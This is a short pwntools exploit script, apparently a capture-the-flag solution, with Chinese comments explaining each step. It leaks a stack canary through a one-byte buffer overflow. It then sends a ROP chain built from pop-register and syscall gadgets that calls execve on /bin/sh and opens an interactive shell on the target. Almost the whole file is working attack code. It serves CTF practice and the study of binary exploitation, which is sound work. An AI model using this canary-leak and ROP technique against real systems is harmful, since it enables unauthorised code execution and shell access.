from pwn import * 
context(arch='amd64', os='linux', log_level='debug')
# context.terminal = ['wt.exe','wsl']
p = process('./pwn')
# p = remote("192.168.31.103",9118)
file = ELF('./pwn')

# gdb.attach(p)

# 第一次read有25B，而buffer只有24B,25B是Canary
p.sendafter(b'id?',b'A'*24 + b'g') # 先触发一下错误
p.recvuntil(b'g') # 读取到g
canary = u64(b'\x00'+ p.recv(7))
log.success(f"canary: {hex(canary)}")


# 第二次read有256B，目标应该是一个全局变量buf2，且未初始化

# 用search工具去查阅一下这些寄存器的地址
rax_ret = file.search(asm('pop rax; ret;')).__next__()
rdi_ret = file.search(asm('pop rdi; ret;')).__next__()
rsi_ret = file.search(asm('pop rsi; ret;')).__next__()
# rdx_ret = file.search(asm('pop rdx; ret;')).__next__()
rdx_ret = 0x000000000049d12b  # 用ROPgadget 查找,注意地址+1 跳过那一条没用的指令
# 0x000000000049d12a : pop rax ; pop rdx ; pop rbx ; ret

log.success(f"rax_ret={hex(rax_ret)},p64(rax_ret)={p64(rax_ret)}")

# 下面两个地址用IDA就可以查看到
system = next(file.search(asm('syscall')))

binsh = 0x00000000004E3950

payload = cyclic(24) + p64(canary) + cyclic(8) + p64(rax_ret) + p64(59)
payload += p64(rdi_ret) + p64(binsh)
payload += p64(rsi_ret) + p64(0)
payload += p64(rdx_ret) + p64(0) + p64(0)
payload += p64(system)


p.sendafter(b"name?\n",payload)
p.sendafter(b"quit",b"-1234")
p.interactive()

# 第三次scanf是对v5的地址进行输入（unsigned int），且格式是uint,说明这个输入可以是一个地址，同时他后面还有4个参数
# v0-v3，edx,ecx,r8d,r9d



